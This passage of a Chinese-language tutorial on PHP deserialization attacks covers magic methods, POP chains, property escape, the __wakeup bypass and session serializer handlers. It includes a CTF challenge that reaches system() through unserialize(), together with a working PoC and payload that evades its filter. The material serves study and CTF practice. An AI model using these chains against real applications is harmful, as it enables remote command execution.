class="string">&quot;O:&lt;type&gt;:&lt;cnt_attrs&gt;&quot;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        object_common(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">object_common</span><span class="params">(UNSERIALIZE_PARAMETER, zend_long elements, zend_bool has_unserialize)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    process_nested_data(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">int</span> <span class="title function_">process_nested_data</span><span class="params">(UNSERIALIZE_PARAMETER, HashTable *ht, zend_long elements, zend_object *obj)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (elements-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        zval key, *data;</span><br><span class="line">        zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line">        php_var_unserialize_internal(&amp;key, p, max, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// assert type(key) == string or type(key) == long</span></span><br><span class="line">        <span class="keyword">if</span> (obj) &#123;</span><br><span class="line">            <span class="comment">// assert string(key) in dir(obj)</span></span><br><span class="line">            <span class="comment">// obj[key] = new ref info // zend_get_typed_property_info_for_slot</span></span><br><span class="line">        &#125;</span><br><span class="line">        php_var_unserialize_internal(data, p, max, var_hash, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (info) &#123;</span><br><span class="line">            <span class="comment">// some checks</span></span><br><span class="line">            zend_ref_add_type_source(Z_REF_P(data), info);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 略</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当反序列化数组、对象这种东西的时候，只有反序列化 值时会传入 <code>var_hash</code> 这个列表， 键并不存在于这个对象中的列表中。真相大白。</p><p>注：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">stdClass</span>);</span><br><span class="line"><span class="variable">$x</span>[<span class="number">1</span>] = &amp;<span class="variable">$x</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;a:2:&#123;i:0;r:2;i:1;R:3;&#125;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ben</span>=<span class="string">&#x27;laoli&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4(类名长)&quot;test&quot;（类名）:2(属性数);&#123;s:3(属性名长):&quot;pub&quot;(属性名);s:6(值长):&quot;benben&quot;(值);s:3:&quot;ben&quot;;s:5:&quot;laoli&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630b7cd36.png" alt="image-20240221200228499"></p><p>当属性类型为public时 会将属性名(test)变为’空’类名属性名’空’（%00(url编码后)test%00pub） 所以前面是9</p><p><img src="https://bu.dusays.com/2024/05/13/6641630b63d17.png" alt="image-20240221200501785"></p><p>同理protected</p><p><img src="https://bu.dusays.com/2024/05/13/6641630bdc53d.png" alt="image-20240221200821384"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630cd4b8d.png" alt="image-20240221200850913"></p><p><code>(0*0--&gt;空*空)</code></p><p>套娃</p><p><img src="https://bu.dusays.com/2024/05/13/66416316aa886.png" alt="image-20240221201215657"></p><p>把一个序列化的对象赋值给ben了</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化是将字符串转换成变量或对象的过程</p><p>·反序列化之后的内容为一个对象</p><p>·反序列化生成的对象里的值由反序列化里的值提供，与原有类预定义的值无关</p><p>·反序列化不触发类的方法，除非是魔术方法或调用方法</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>成因：反序列化过程中，unserialize()的值可控，通过更改这个值，得到所需要的代码</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>一个预定义好的，在特定情况下<strong>自动触发</strong>的行为方法</p><p>魔术方法在特定条件下自动调用相关方法</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p> <img src="https://bu.dusays.com/2024/05/13/6641631e96b7c.png" alt="image-20240221205308936"></p><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d21e1e.png" alt="image-20240221205909384"></p><h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>析构函数，在对象所有的引用被删除或者当对象被显式销毁时执行的魔术方法</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e39c9a.png" alt="image-20240221210856966"></p><p>在序列化过程中不会触发</p><p>在反序列化过程中会触发</p><p>实例化对象结束后也会触发</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p>序列化serialize()函数会检查类中是否存在一个魔术方法__sleep(),若存在，则该方法会先被调用，再执行序列化</p><p>返回需要被序列化存储的成员属性，删除不必要的属性</p><p><img src="https://bu.dusays.com/2024/05/13/6641630dd90a0.png" alt="image-20240221212013413"></p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>与__sleep()相反</p><p>反序列化unserialize()会检查是否存在一个__wakeup()方法，若存在，则会先调用该方法。预先准备对象需要的资源</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e5015a.png" alt="image-20240221212801941"></p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p>把对象当作字符串调用时触发   echo</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d0d34d.png" alt="image-20240221213659411"></p><h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><p>把对象当作函数调用时触发  return</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ca4b96.png" alt="image-20240221213830977"></p><h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>调用一个不存在的方法时触发  $this-&gt;aa</p><p>两个参数<code>$arg1,$arg2</code></p><p>返回值：调用的不存在的方法名和参数</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e12ba3.png" alt="image-20240221214624310"></p><h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><p>静态调用或者调用成员常量时使用的方法不存在，此时触发</p><p>两个参数<code>$arg1,$arg2</code></p><p>返回值：调用的不存在的方法和名称的参数</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d1c0a4.png" alt="image-20240221214943446"></p><h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4><p>调用的成员属性不存在时触发  $this-&gt;aa-&gt;bb</p><p>一个参数$arg1</p><p>返回值：不存在的属性名</p><p><img src="https://bu.dusays.com/2024/05/13/6641630c5f424.png" alt="image-20240221215200717"></p><h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4><p>给不存在的属性赋值时触发</p><p>两个参数<code>$arg1,$arg2</code></p><p>返回值：不存在的属性名和赋的值</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d254fe.png" alt="image-20240221215600389"></p><h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>对不可访问属性使用isset()或empty()时，触发</p><p>一个参数$arg1</p><p>返回值:不存在&#x2F;不可访问的属性名</p><p><img src="https://bu.dusays.com/2024/05/13/6641630c57890.png" alt="image-20240221220406133"></p><h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4><p>对不可访问属性使用unset()时触发</p><p>一个参数$arg1</p><p>返回值：不可访问的成员属性名</p><p><img src="https://bu.dusays.com/2024/05/13/6641630c6707c.png" alt="image-20240221220715991"></p><h4 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h4><p>当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e21a57.png" alt="image-20240221221003602"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://bu.dusays.com/2024/05/13/6641631dba40b.png" alt="image-20240221221040252"></p><p><img src="https://bu.dusays.com/2024/05/13/66416322558fd.png" alt="image-20240221221103912"></p><h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>例题</p><p><img src="https://bu.dusays.com/2024/05/13/664163183e444.png" alt="image-20240221222425146"></p><p>思路：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630f488fc.png" alt="image-20240221222455837"></p><p>这里的__construction不会被调用，因为没有序列化</p><p>法1：</p><p><img src="https://bu.dusays.com/2024/05/13/66416317c6177.png" alt="image-20240221222807543"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631387598.png" alt="image-20240221222830808"></p><p>法2：</p><p>1.删去没用的</p><p><img src="https://bu.dusays.com/2024/05/13/6641630bcd0b0.png" alt="image-20240221223408086"></p><p>2.类外赋值</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e243ab.png" alt="image-20240221223556996"></p><p>魔术方法触发前提：魔术方法所在类（或对象）被调用</p><p><img src="https://bu.dusays.com/2024/05/13/664163140ec43.png" alt="image-20240222185057772"></p><h3 id="pop链构造与poc编写"><a href="#pop链构造与poc编写" class="headerlink" title="pop链构造与poc编写"></a>pop链构造与poc编写</h3><p>pop链就是利用魔术方法在里面进行多次跳转 然后获取敏感数据的一种payload</p><p>poc:概念验证，在安全界可以理解成漏洞验证程序，poc是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码</p><p><img src="https://bu.dusays.com/2024/05/13/664163242bc9e.png" alt="image-20240222191258816"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631a54909.png" alt="image-20240222194203684"></p><h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p>反序列化分隔符</p><p>反序列化以;}结束,后面的字符不影响正常的反序列化</p><p>属性逃逸</p><p>一般的数据先经过一次serialize再经过unserialize,在这个中间反序列化的字符串变多或者变少的时候很有可能存在反序列化属性逃逸</p><h3 id="减少逃逸"><a href="#减少逃逸" class="headerlink" title="减少逃逸"></a>减少逃逸</h3><p><img src="https://bu.dusays.com/2024/05/13/664163218a2dd.png" alt="image-20240222200324129"></p><p><img src="https://bu.dusays.com/2024/05/13/66416321ba66f.png" alt="image-20240222200602151"></p><p><img src="https://bu.dusays.com/2024/05/13/664163235591a.png" alt="image-20240222215131008"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631443ca3.png" alt="image-20240222215710380"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631c96652.png" alt="image-20240222220117373"></p><p>例题</p><p><img src="https://bu.dusays.com/2024/05/13/66416323a3f31.png" alt="image-20240222223402500"></p><p><img src="https://bu.dusays.com/2024/05/13/66416321c36d3.png" alt="image-20240222223656946"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631794375.png" alt="image-20240222223727807"></p><h3 id="增多逃逸"><a href="#增多逃逸" class="headerlink" title="增多逃逸"></a>增多逃逸</h3><p><img src="https://bu.dusays.com/2024/05/13/66416320496e9.png" alt="image-20240222220245356"></p><p><img src="https://bu.dusays.com/2024/05/13/66416316f12c1.png" alt="image-20240222220425811"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632379a46.png" alt="image-20240222220654985"></p><p>例题</p><p><img src="https://bu.dusays.com/2024/05/13/66416319ea330.png" alt="image-20240222222118718"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631c618f6.png" alt="image-20240222222353281"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a0dabde07.png" alt="image-20240222222407358"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631cabf30.png" alt="image-20240222223129660">                                                                                                                                                                                                                                                       </p><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h2><p>条件：</p><p>php5&lt;5.6.25</p><p>php7&lt;7.0.10</p><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__wakeup()的执行</p><p><img src="https://bu.dusays.com/2024/05/13/66416320665b2.png" alt="image-20240227194527697"></p><p>例</p><p><img src="https://bu.dusays.com/2024/05/13/664163232c833.png" alt="image-20240227194811041"></p><p><img src="https://bu.dusays.com/2024/05/13/66416323becd6.png" alt="image-20240227194915527"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631c25bc2.png" alt="image-20240227195002743"></p><p><code>+可以绕过正则表达式</code></p><p><img src="https://bu.dusays.com/2024/05/13/66416313493c5.png" alt="image-20240227195216055"></p><p><strong>当正则过滤R&#x2F;r后数字时  可以用引用绕过</strong></p><p>但是__wakeup中要有：<code>$this-&gt;b = $this-&gt;a;</code></p><p>帕鲁杯R23</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/R:2|R:3/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $b;</span></span><br><span class="line"><span class="comment">//    public function __get($a)&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b-&gt;love();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $a;</span></span><br><span class="line"><span class="comment">//    public $b;</span></span><br><span class="line"><span class="comment">//    public $c;</span></span><br><span class="line"><span class="comment">//    public function __destruct()&#123;</span></span><br><span class="line"><span class="comment">//        $tmp = $this-&gt;c-&gt;name;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;c = &quot;no!&quot;;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b = $this-&gt;a;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function love()&#123;</span></span><br><span class="line"><span class="comment">//        system($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if(preg_match(&#x27;/R:2|R:3/&#x27;,$_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;no&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$xk</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$xk</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b = &amp;<span class="variable">$b</span>-&gt;c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;b&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:1:&quot;b&quot;;O:2:&quot;xk&quot;:0:&#123;&#125;&#125;s:1:&quot;c&quot;;N;s:1:&quot;b&quot;;R:4;&#125;</span><br></pre></td></tr></table></figure><p>也可以想其他办法将R后的数字改了 </p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>例：</p><p><img src="https://bu.dusays.com/2024/05/13/66416322cc32c.png" alt="image-20240227200401573"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630f30a95.png" alt="image-20240227200430070"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630d00d0f.png" alt="image-20240227200441675"></p><p>构造</p><p><code>$a-&gt;enter=&amp;$a-&gt;secret</code></p><p>使enter的值随secret变化而变化</p><p>secret再取enter的值 就一样了</p><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>当session_start()被调用或者php.ini中的session.auto_star为1时，php内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp）</p><p><img src="https://bu.dusays.com/2024/05/13/664163221be00.png" alt="image-20240227201906897"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630fc978e.png" alt="image-20240228235355463"></p><p>赋值123456</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d5dc96.png" alt="image-20240228235539736"></p><p>键名+竖线+经过serialize()函数处理过的值</p><p><img src="https://bu.dusays.com/2024/05/13/6641631aa6be4.png" alt="image-20240228235926447"></p><p><img src="https://bu.dusays.com/2024/05/13/66416314a59c3.png" alt="image-20240229000033551"></p><p><img src="https://bu.dusays.com/2024/05/13/66416320af6ba.png" alt="image-20240229000223635"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630e8d329.png" alt="image-20240229000546732"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632427238.png" alt="image-20240229003011924"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a0ef1700e.png" alt="image-20240229003051944"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632425d21.png" alt="image-20240229003121533"></p><p>例：</p><p><img src="https://bu.dusays.com/2024/05/13/66416314b7419.png" alt="image-20240303175045112"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630e82d6a.png" alt="image-20240303175336453"></p><p><img src="https://bu.dusays.com/2024/05/13/66416319738fb.png" alt="image-20240303175451812"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a0edb6163.png" alt="image-20240303175554019"></p><p><strong>补：</strong></p><h3 id="php-session理解"><a href="#php-session理解" class="headerlink" title="php session理解"></a>php session理解</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p>session:</p><p>Session一般称为“<strong>会话控制</strong>”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p><p>php session:</p><p>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p><p>php session工作流程:</p><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p><p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p><p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;xianzhi&#x27;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p><p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：</p><p><img src="https://bu.dusays.com/2024/05/13/6641631496d22.png" alt="image-20240502143605251"></p><p>php session在php.ini中的配置</p><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure><ul><li>session.save_handler&#x3D;””</li></ul><p> <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p><ul><li><strong>session.serialize_handler</strong></li></ul><p>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p><p><a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p><h3 id="处理器与利用"><a href="#处理器与利用" class="headerlink" title="处理器与利用"></a>处理器与利用</h3><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ee6818.png" alt="image-20240502143933690"></p><p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p><p>并且文件的内容始终是session值的序列化之后的内容。</p><h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span></span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br></pre></td></tr></table></figure><p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p><p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，如果存在就是用这个session_id，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p><p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p><ul><li><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</li><li><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</li></ul><p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p><h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td></tr></tbody></table><p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p><p>上述三种处理器中，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 